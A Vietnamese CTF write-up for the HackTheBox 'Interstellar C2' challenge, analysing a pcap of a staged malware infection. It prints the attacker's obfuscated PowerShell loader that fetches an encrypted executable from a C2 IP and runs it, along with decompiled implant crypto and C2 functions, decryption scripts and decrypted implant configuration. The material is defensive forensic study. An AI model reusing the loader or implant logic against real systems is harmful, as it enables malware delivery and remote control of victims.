<img width="2176" height="1196" alt="image" src="https://github.com/user-attachments/assets/d727557e-eb1e-4bf3-83bb-38bc60dd4c67" />

# Interstellar C2

### Scenario: We noticed some interesting traffic coming from outer space. An unknown group is using a Command and Control server. After an exhaustive investigation, we discovered they had infected multiple scientists from Pandora's private research lab. Valuable research is at risk. Can you find out how the server works and retrieve what was stolen?


### Skill:
- Obfuscated powershell
- Reverse skill for executable file
- AES decrypt and take pattern from ciphertext
- Read and analyzed stream in  pcap
- Steganography skill

### Writeup 
Challenge này cho chúng ta một artifact duy nhất là file pcap, và chúng ta có nhiệm vụ là cần phân tích một bản thu thập lưu lượng mạng về 1 cuộc tấn công vào bên trong cơ sở của một phòng thí nghiệm và đã drop vào hệ thống các malicious file exploit hệ thống, thu thập credentials, kết nối c2, tạo backdoor. Target của challenge là thực hiện convert lại context và cover lại những gì mà attacker đã dump ra được.

Đầu tiên mình sẽ check qua `tcp.stream eq 0` để phân tích từng luồng trong lưu lượng mạng hiện tại, và ở ngay stream đầu tiên chúng ta sẽ có thể thấy được một file ps1 đã được máy server victim tải xuống:

<img width="2487" height="356" alt="image" src="https://github.com/user-attachments/assets/07a715a7-c54f-42b7-ba26-672c29fe1e1a" />

Ở đây có thể trước đó đã có một bước recon và initial access để có thể exploit và compromised vào bên trong server sau đó tải xuống file `.ps1` này:

```powershell
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so')  ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ;  &("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3  ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte'));  .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle')  BI34  (  [TyPE]("{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}" -f 'TEm.secU','R','Y.CrY','IT','s','Y.','D','yS','pTogrAPH','E','CrypTOSTReAmmo'));  ${U`Rl} = ("{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"-f 'htt','4f0','53-41ab-938','d8e51','p://64.226.84.200/9497','8','58','a-ae1bd8','-','6')
${P`TF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.("{2}{1}{3}{0}"-f'ule','M','Import-','od') ("{2}{0}{3}{1}"-f 'r','fer','BitsT','ans')
.("{4}{5}{3}{1}{2}{0}"-f'r','-BitsT','ransfe','t','S','tar') -Source ${u`Rl} -Destination ${p`Tf}
${Fs} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{2}{0}"-f 'eam','IO.','FileStr')(${p`Tf},  ( &("{3}{1}{0}{2}" -f'lDIt','hi','eM','c')  ('VAria'+'blE'+':Q'+'L'+'z0sO')).VALue::"oP`eN")
${MS} = .("{3}{1}{0}{2}"-f'c','je','t','New-Ob') ("{5}{3}{0}{2}{4}{1}" -f'O.Memor','eam','y','stem.I','Str','Sy');
${a`es} =   (&('GI')  VARiaBLe:l60Yu3).VAluE::("{1}{0}" -f'reate','C').Invoke()
${a`Es}."KE`Y`sIZE" = 128
${K`EY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${a`ES}."K`EY" = ${K`EY}
${A`es}."i`V" = ${i`V}
${cS} = .("{1}{0}{2}"-f'e','N','w-Object') ("{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}" -f 'phy.Crypto','ptogr','ecuri','rea','Syste','S','m.S','m','t','ty.Cry','a')(${m`S}, ${a`Es}.("{0}{3}{2}{1}" -f'Cre','or','pt','ateDecry').Invoke(),   (&("{1}{2}{0}"-f 'ARIaBLE','Ge','T-V')  bI34  -VaLue )::"W`RItE");
${f`s}.("{1}{0}"-f 'To','Copy').Invoke(${Cs})
${d`ecD} = ${M`s}.("{0}{1}{2}"-f'T','oAr','ray').Invoke()
${C`S}.("{1}{0}"-f 'te','Wri').Invoke(${d`ECD}, 0, ${d`ECd}."LENg`TH");
${D`eCd} | .("{2}{3}{1}{0}" -f'ent','t-Cont','S','e') -Path "$env:temp\tmp7102591.exe" -Encoding ("{1}{0}"-f 'yte','B')
& "$env:temp\tmp7102591.exe"
```

Đây là một file obfuscated lệnh powershell, và mình có search một lúc về các tools dùng để thực hiện deobfuscated powershell script, thì mình tìm thấy repo [PowerDecode](https://github.com/Malandrone/PowerDecode), dùng để thực hiện deobfuscated sâu vào powerdecode, ghi rõ các hành vi, các pattern cần thiết cho việc giải mã payload, và vvvv

<details>
  <summary>
    Output PowerDecode
  </summary>

```powershell
______                     ______                   _      
| ___ \                    |  _  \                 | |     
| |_/ /____      _____ _ __| | | |___  ___ ___   __| | ___ 
|  __/ _ \ \ /\ / / _ \ '__| | | / _ \/ __/ _ \ / _` |/ _ \
| | | (_) \ V  V /  __/ |  | |/ /  __/ (_| (_) | (_| |  __/
\_|  \___/ \_/\_/ \___|_|  |___/ \___|\___\___/ \__,_|\___| 

                   PowerShell Script Decoder

File sha256: 2B4E64AC5378C1EF48C8F4421814436C97E295E60356CE3C12B5E39D1995630A
==================================================================================
Layer 1 - Obfuscation type: String-Based

.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so')  ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ;  &("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3  ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte'));  .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle')  BI34  (  [TyPE]("{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}" -f 'TEm.secU','R','Y.CrY','IT','s','Y.','D','yS','pTogrAPH','E','CrypTOSTReAmmo'));  ${U`Rl} = ("{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"-f 'htt','4f0','53-41ab-938','d8e51','p://64.226.84.200/9497','8','58','a-ae1bd8','-','6')
${P`TF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.("{2}{1}{3}{0}"-f'ule','M','Import-','od') ("{2}{0}{3}{1}"-f 'r','fer','BitsT','ans')
.("{4}{5}{3}{1}{2}{0}"-f'r','-BitsT','ransfe','t','S','tar') -Source ${u`Rl} -Destination ${p`Tf}
${Fs} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{2}{0}"-f 'eam','IO.','FileStr')(${p`Tf},  ( &("{3}{1}{0}{2}" -f'lDIt','hi','eM','c')  ('VAria'+'blE'+':Q'+'L'+'z0sO')).VALue::"oP`eN")
${MS} = .("{3}{1}{0}{2}"-f'c','je','t','New-Ob') ("{5}{3}{0}{2}{4}{1}" -f'O.Memor','eam','y','stem.I','Str','Sy');
${a`es} =   (&('GI')  VARiaBLe:l60Yu3).VAluE::("{1}{0}" -f'reate','C').Invoke()
${a`Es}."KE`Y`sIZE" = 128
${K`EY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${a`ES}."K`EY" = ${K`EY}
${A`es}."i`V" = ${i`V}
${cS} = .("{1}{0}{2}"-f'e','N','w-Object') ("{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}" -f 'phy.Crypto','ptogr','ecuri','rea','Syste','S','m.S','m','t','ty.Cry','a')(${m`S}, ${a`Es}.("{0}{3}{2}{1}" -f'Cre','or','pt','ateDecry').Invoke(),   (&("{1}{2}{0}"-f 'ARIaBLE','Ge','T-V')  bI34  -VaLue )::"W`RItE");
${f`s}.("{1}{0}"-f 'To','Copy').Invoke(${Cs})
${d`ecD} = ${M`s}.("{0}{1}{2}"-f'T','oAr','ray').Invoke()
${C`S}.("{1}{0}"-f 'te','Wri').Invoke(${d`ECD}, 0, ${d`ECd}."LENg`TH");
${D`eCd} | .("{2}{3}{1}{0}" -f'ent','t-Cont','S','e') -Path "$env:temp\tmp7102591.exe" -Encoding ("{1}{0}"-f 'yte','B')
& "$env:temp\tmp7102591.exe"
==========================================================================================
Layer 2 - Plainscript


Set-iTem 'vAriAble:qLz0so'  ( [tYpe]'SySTEM.io.FilEmode') ;  set-VariABLE l60Yu3  ( [tYPe]'sYStem.SeCuRiTY.crypTOgRAphY.aeS');  Set-VARiaBle  BI34  (  [TyPE]'sySTEm.secURITY.CrYpTogrAPHY.CrypTOSTReAmmoDE');  ${URl} = 'http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51'
${PTF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
Import-Module 'BitsTransfer'
Start-BitsTransfer -Source ${uRl} -Destination ${pTf}
${Fs} = New-Object 'IO.FileStream'(${pTf},  ( chilDIteM  'VAriablE:QLz0sO').VALue::"oPeN")
${MS} = New-Object 'System.IO.MemoryStream';
${aes} =   (GI  VARiaBLe:l60Yu3).VAluE::'Create'.Invoke()
${aEs}.KEYsIZE = 128
${KEY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${aES}.KEY = ${KEY}
${Aes}.iV = ${iV}
${cS} = New-Object 'System.Security.Cryptography.CryptoStream'(${mS}, ${aEs}.CreateDecryptor.Invoke(),   (GeT-VARIaBLE  bI34  -VaLue )::"WRItE");
${fs}.CopyTo.Invoke(${Cs})
${decD} = ${Ms}.ToArray.Invoke()
${CS}.Write.Invoke(${dECD}, 0, ${dECd}.LENgTH);
${DeCd} | Set-Content -Path "$env:temp\tmp7102591.exe" -Encoding 'Byte'
& "$env:temp\tmp7102591.exe"

```
</details>

Ở đây toàn bộ mal script thực hiện việc connect tới server C2 của attacker: `http://64.226.84.200/` sau đó thực hiện tải về file `94974f08-5853-41ab-938a-ae1bd86d8e51 - tmp7102591.exe` tạo biến môi trường và lưu vào thư mục temp để evasion, sau đó thực hiện giải mã bằng:

key -> byte: `0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0` và iv -> byte: `0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1` với mode là aes cbc, bây giờ tiếp tục check theo đúng url trên để xem payload được tải về từ C2 server

<img width="2179" height="267" alt="image" src="https://github.com/user-attachments/assets/543dea78-be29-4ca4-af3f-c22e96151c0f" />

Check qua tcp stream 1 mình sẽ thấy malicious script trên máy của victim đang thực hiện request GET về metadata của url chứa malware của stage1, và ở đây server c2 của attacker đã trả về đầy đủ thông tin metadata gồm:

- Mã code cho thấy server đã reply thành công (200)
- Server: SimpleHTTP/0.6 Python/3.8.10
- Date: Thu, 9/3/2023 08:07:42
- Content type octet stream -> dùng để chỉ các dữ liệu được chuyển đi với định dạng không rõ ràng và thông thường là các file binary
- Content length 18960

Và tới stream tiếp theo mình sẽ thấy được server victim đã download xuống thành công toàn bộ binary của file: `tmp7102591.exe`, bây giờ mình thực hiện tải file này về và giải mã để lấy được payload dropper stage1:

<img width="2421" height="478" alt="image" src="https://github.com/user-attachments/assets/f16bd791-9312-481d-8626-3f4b96aa336f" />

Dùng tshark với command: `tshark -r capture.pcap -Y "tcp.stream eq 2 %% data.data" -T fields -e data.data > payload_encrypted_stage1.bin`

Sau đó mình viết 1 script nhỏ để thực hiện decrypt payload này:

```python
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

input_file = "payload_encrypted_stage1.bin"
output_file = "payload_dec_stage1.bin"

key = bytes([0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0])
iv = bytes([0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1])

with open(input_file, "rb") as f:
    ciphertext = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
padded_plaintext = cipher.decrypt(ciphertext)

try:
    plaintext = unpad(padded_plaintext, AES.block_size)
except ValueError as exc:
    raise ValueError("PKCS#7 invalid, wrong key or iv or ciphertext") from exc

print(f"Ciphertext Length: {len(ciphertext)} bytes")
print(f"Decrypted Length: {len(plaintext)} bytes")


if plaintext.startswith(b"MZ"):
    print("This is a PE executable file")



with open(output_file, "wb") as f:
    f.write(plaintext)

```
Sau đó mình sẽ thu được file payload sau khi decrypted và mình thử detect nó bằng `Detect it easy`:

<img width="1097" height="674" alt="image" src="https://github.com/user-attachments/assets/401903c6-4ff6-4fe7-b25c-d7af3e2cd3ab" />

Đây là một file được compiler bằng C#, nên mình sẽ tiếp tục dùng dnpsy để thực hiện reverse tiếp:

<img width="3806" height="2005" alt="image" src="https://github.com/user-attachments/assets/023f7522-d45d-49b7-8d6d-a6bd4911cc70" />

Sau khi nạp vào dnpsy thì nó dựa vào hash của file malicious này đã được up lên các nền tảng community lớn như: 'virustotal', nên dnpsy đã tự định nghĩa tên của file mal này là `dropper_cs.exe`, giờ mình sẽ đi vào các hàm thực hiện transfer, decrypt, encrypt, cơ chế gen và evasion pattern cho phần decrypt stage sau của attacker:

 **CreateCam()**
```C#
private static SymmetricAlgorithm CreateCam(string key, string IV, bool rij = true)
{
	SymmetricAlgorithm symmetricAlgorithm;
	if (rij)
	{
		symmetricAlgorithm = new RijndaelManaged();
	}
	else
	{
		symmetricAlgorithm = new AesCryptoServiceProvider();
	}
	symmetricAlgorithm.Mode = CipherMode.CBC;
	symmetricAlgorithm.Padding = PaddingMode.Zeros;
	symmetricAlgorithm.BlockSize = 128;
	symmetricAlgorithm.KeySize = 256;
	if (IV != null)
	{
		symmetricAlgorithm.IV = Convert.FromBase64String(IV);
	}
	else
	{
		symmetricAlgorithm.GenerateIV();
	}
	if (key != null)
	{
		symmetricAlgorithm.Key = Convert.FromBase64String(key);
	}
	return symmetricAlgorithm;
}

```
> Hàm này chủ yếu sẽ định nghĩa cho chúng ta thuật toán được sử dụng trong quá trình encrypt:
> 1 số pattern lấy ra được bao gồm:
> -> Mode AES_CBC
> -> Sẽ có 1 hàm thực hiện GEN ra IV và Key if cả 2 là null

**Decryption()**
```C#
private static string Decryption(string key, string enc)
{
	byte[] array = Convert.FromBase64String(enc);
	byte[] array2 = new byte[16];
	Array.Copy(array, array2, 16);
	string @string;
	try
	{
		SymmetricAlgorithm symmetricAlgorithm = Program.CreateCam(key, Convert.ToBase64String(array2), true);
		byte[] bytes = symmetricAlgorithm.CreateDecryptor().TransformFinalBlock(array, 16, array.Length - 16);
		@string = Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(bytes).Trim(new char[1])));
	}
	catch
	{
		SymmetricAlgorithm symmetricAlgorithm2 = Program.CreateCam(key, Convert.ToBase64String(array2), false);
		byte[] bytes2 = symmetricAlgorithm2.CreateDecryptor().TransformFinalBlock(array, 16, array.Length - 16);
		@string = Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(bytes2).Trim(new char[1])));
	}
	finally
	{
		Array.Clear(array, 0, array.Length);
		Array.Clear(array2, 0, 16);
	}
	return @string;
}
```
-> Hàm này đóng vai trò thực hiện decryption phần payload mà được C2 server gửi cho malware, và cách mà nó gen ra IV để làm pattern trong quá trình decryption:
> Ở đây mình sẽ thấy ban đầu sẽ tạo một mảng `array` chứa phần raw byte của agr `enc`
> 
> Tiếp theo là tạo 1 mảng `array2` dài 16 bytes
> 
> Sau đó copy đúng 16 bytes đầu của mảng `array` vào `array2` -> Mình nhận thấy ở đây chắc chắn là quá trình sinh ra IV -> vì IV có length dài đúng 16 bytes, hơn nữa sau đó bên dưới sẽ thấy gọi đến hàm `CreateCam()` mà mình vừa phân tích bên trên dành cho việc triển khai thuật toán AES_CBC. -> Lần gọi hàm này để định nghĩa các tham số cho pattern.
> 
> Cơ chế hàm này -> Tạo ra 1 block try,catch - fallback: Nếu lần `try` thất bại do các yếu tố sai pattern, -> fallback cho catch tiếp tục thực hiện
> 
> -> `CreateCam(key, Convert.ToBase64String(array2), true) -> True dành cho thành công ở lần đầu`
> 
> -> `CreateCam(key, Convert.ToBase64String(array2), false) -> False dành cho nếu lần đầu thử sai`
>
> Cuối cùng giải phóng mảng được tạo


**Encryption()**
```C#
private static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
{
	byte[] array = null;
	if (unByte != null)
	{
		array = unByte;
	}
	else
	{
		array = Encoding.UTF8.GetBytes(un);
	}
	if (comp)
	{
		array = Program.Compress(array);
	}
	string result;
	try
	{
		SymmetricAlgorithm symmetricAlgorithm = Program.CreateCam(key, null, true);
		byte[] second = symmetricAlgorithm.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
		result = Convert.ToBase64String(Program.Combine(symmetricAlgorithm.IV, second));
	}
	catch
	{
		SymmetricAlgorithm symmetricAlgorithm2 = Program.CreateCam(key, null, false);
		byte[] second2 = symmetricAlgorithm2.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
		result = Convert.ToBase64String(Program.Combine(symmetricAlgorithm2.IV, second2));
	}
	return result;
}
```
-> Hàm này đóng vai trò mã hóa, thực hiện các chức năng bao gồm:
> Nếu tham số `comp = true` -> thực hiện compress mảng `array`
> Setup cho thuật toán mã hóa AES với key cố định, còn lại `IV = null` -> thì hàm `CreateCam()` sẽ thực hiện trường hợp `GenerateIV()` ngẫu nhiên
> Tiếp theo sẽ thực hiện dùng hàm `Combine()` để tạo thành structure (IV || Ciphertext) -> Ghép first byte và Second Byte lại với nhau.

Các hàm `Exec()`, `GetConsoleWindows()`, `GetCurrentThread()`, `GetWebRequest()`, `ihInteg`:
-> Thực hiện các vai trò tạo cookies fake, tạo user agent để bypass firewall và các hệ thống giám sát
-> Nhận giá trị của thread hiện tại đang chạy
-> Hàm xử lý payload cho stage tiếp theo với key, command cmdoutput,.. được giấu bên trong các byte ảnh.
-> Hàm nhận về giá trị của permissions của user đang chạy hiện tại của máy tính

Hàm `ImplantCore()` - đây là hàm thực hiện logic chính, bên trong logic của script này sẽ chứa những chuỗi dùng để tách các phần payload được sử dụng cho stage sau như:

- `multicmd`: Dùng để nhận biết phần payload được giấu bên trong ảnh
- `loadmodule`: Đùng để tách 2 file module từ stage3
- `!d-3dion@LD!-d` -> Strings báo hiệu phần raw bytes gặp chuỗi này sẽ là payload.

Hàm `primer()` -> Bên trong hàm này chứa key cứng được lưu trong biến `key`, ngoài ra còn có phần định nghĩa cho các pattern được sử dụng trong stage sau, quan trọng nhất là:
- `NEWKEY8839394(.*)4939388YEKWEN`: Key mới được sử dụng trong stage3 sẽ được lưu trong regex newkey
- `IMGS19459394(.*)49395491SGMI`: Phần image, được gen để lưu payload bên trong

Còn lại là các hàm để chấm dứt thread, hàm `main()` gọi đến hàm `Sharp()` -> Callback `primer()` -> Callback `GetWebRequest()` -> DownloadString - Thực hiện decryption payload nhận được từ C2 server -> Gọi đến `ImplantCore()` -> tách cmd command, module stage3,.. -> CallBack đến `Exec()`

2 Class `ImgGen` và `UrlGen`: Cũng lần lượt có logic như sau:
Với class `ImgGen`:
- Phần payload được giấu bên trong image, sẽ tính từ byte 1500 sẽ là phần payload chính.
- Function `GetImgData()` -> Sẽ ghi rõ phần logic này nhất, nó cho thấy cách nó tạo ra mảng chứa payload chính được copy vào `cmdoutput`.

Với class `UrlGen`:
- Chủ yếu tạo ra một url theo chuỗi list các phần uri được nhận thông qua việc decrypt phần payload ở tcp stream tiếp theo, ghép các fragment thành 1 url hoàn chỉnh, để tạo ra các request response nhìn legit.

> Thế là xong được toàn bộ phần stage2 dropper.cs này, nó đảm nhiệm vai trò định nghĩa cách gen ra iv, key cho các stage tiếp theo, cách payload được giấu trong ảnh, cách malware này nhận command từ C2 server, và cách tạo ra các url bypass qua được firewall và moitor system.


Tiếp theo mình sẽ thực hiện download phần encrypt payload, mà malware nhận được từ C2 server chứa key cho các hành động tiếp theo, trước đó mình cũng biết được cách IV và Key được lấy thế nào, nên mình sẽ vào GET về stream chứa payload:

```bash
┌──(nhduydeptrai㉿tobi)-[/mnt/…/CTF/HACK_THE_BOX/Challenge/Interstellar C2]
└─$ tshark -r capture.pcapng -Y "tcp.stream eq 3" -T fields -e http.file_data > payload_stage2.bin
```

<details>
  <summary>
    Script decrypt stage2
  </summary>

```python
from pathlib import Path
import base64
import zlib

from Crypto.Cipher import AES


key = base64.b64decode("DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=")
with open("stage2_payload.bin", "rb") as f:
    encoded = "".join(f.read().decode("ascii").split())

b64_cipher = base64.b64decode(encoded)
iv = b64_cipher[:16]
ciphertext = b64_cipher[16:]

print(f"IV: {len(iv)} bytes")
print(f"iv: {iv.hex()}")
print(f"ciphertext length: {len(ciphertext)} bytes")
print(f"ciphertext: {ciphertext.hex()}")

cipher = AES.new(key, AES.MODE_CBC, iv)

b64_plaintext = cipher.decrypt(ciphertext).rstrip(b"\x00")
plaintext = base64.b64decode(b64_plaintext, validate=True)


print(f"Length of plaintext: {len(plaintext)}")
print(f"plaintext: {plaintext}")
```
</details>

Mình có được ouput:
<details>
  <summary>
    Output Stage2
  </summary>

```

RANDOMURI19901dVfhJmc2ciKvPOC10991IRUMODNAR
URLS10484390243"Kettie/Emmie/Anni?Theda=Merrilee", "Rey/Odele/Betsy/Evaleen/Lynnette?Violetta=Alie", "Wilona/Sybila/Pearla/Mair/Dannie/Darcie/Katerina/Irena/Missy/Ketty/", "Hedwiga/Pamelina/Lisette/Sibylla/Jana/Lise/Kellen/Daniela/Alika/", "Arlinda/Chelsae/Milka/Alexine/Mona/Catherin/Charmain/Deborah/", "Melessa/Anabelle/Bibbye/Candis/Jacqueline/Lacee/Nicola/Belvia?Lexi=Veronika", "Janith/Mona/Kimberlee/Flossi/Darcie/Doralia/Aloysia/Gracia/Antonella?Othella=Jewelle", "Vere/Maddalena/Kara/Thomasina/Alisha/Amargo/Carrissa/", "Harlie/Fanya/Jehanna/Jane/Tami/Sissy/", "Catlaina/Nikaniki/Sonja/Denni/Kelsey/Allis/Cherry?Hayley=Rosalind", "Gerry/June/Charissa/Blondy/Sharity/Lory?Loise=Maribelle", "Ariadne/Marianna/Betti/Samaria/Carmon/Tandy/Charissa/Sherrie/Felipa/Crissy/", "Glennis/Elfrieda/Fannie/Nola/Janetta/Darda/Kathi/Britte?Berta=Lidia", "Georgeta/Sharron/Cynthy/Roseanna/", "Morganne/Mamie/Arlee/Suki/Uta/Anett/Sena/Babette/Anderea?Hally=Karie", "Zondra/Tasha/Rey/Eolande/Rianon/Alla/Trula/Cynthea/Glyn?Jamima=Ethyl", "Edi/Phyllys/Marga/Jaquith/Ray/Lynnell/Flory?Angelle=Betteanne", "Ciel/Constantine/Catlee?Cecile=Karina", "Kaylee/Guglielma/Clementia/Ilka/", "Zoe/Delora/Christi/Carolan/Barbi/Myrta/Cherie/Halie/", "Brandy/Joanna/Afton/Jana?Chelsea=Truda", "Aveline/Alethea/Rona/Janka/Danila/Robbyn/Glynda/Stormi/", "Tamiko/Carine/Juliann/", "Jacenta/Hatti?Tatiana=Franny", "Hyacinth/", "Merrili/Gabrila/Harmony/Erda/", "Mirelle/Imogene/Rivalee/Ayn/Courtenay?Jania=Jerrylee", "Imogen/Ketti/Kari/Sam/Maurise?Shirlene=Eugenia", "Melinda/Lianne/Blancha/Silvie/Gracia/Zaneta/Lyda/Dalia/Tracie/", "Fanchette/Marlyn/Casey/Bobbye/Elayne/Charmane/", "Cissiee/Maxy/Madalyn/Esme/Esther/Barbette/Starla/Vin/Corrinne/Meggy/Joete?Glenna=Aida", "Kirsteni/Nelie/Lauralee/Stefanie/Haily/Annecorinne/Nettle/Natka?Jenda=Ursuline", "Elinore/", "Maisie/Hedwig/Natividad?Gisela=Ollie", "Roselle/Philippa/Noellyn/Zarah/Tillie/Koral/Laurette/Lelah/Kylynn/Cassaundra/Jordanna?Stormy=Vally", "Abbi/Rania/Vivienne/Engracia/Adel/Ange/Tonye/Rosemaria/Gretta/Guinna/Jehanna?Linnet=Daria", "Mamie/Eddi/Eddi/Tanitansy/Timmy/Willie/Catie/Gisela/Sheri/", "Helaina/Theadora/Malinda/Linnie/Jaquith/Ailyn/Magda?Sisile=Vonnie", "Faunie/Dionne/Shelbi/Zorana/Pearline/Rozanna/Kandace/Fanchon?Anna-Diana=Lorelei", "Waneta/Marnie/Jessalyn/Jaynell/Holli/Kassi/Euphemia/Katerine?Minda=Dawna", "Kikelia/Jacinthe/Adorne/Kariotta/Lonee/Krystalle/", "Constancia/Dynah?Allene=Moyra", "Donetta/", "Sallie/Lindie/Denni/", "Jeannine/Lucretia/Denna/Prudy/Hendrika/Ilysa/Caroljean?Aline=Tine"34209348401SLRU
KILLDATE16652025-01-015661ETADLLIK
SLEEP980013s10089PEELS
JITTER20250.25202RETTIJ
NEWKEY8839394nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=4939388YEKWEN
IMGS19459394"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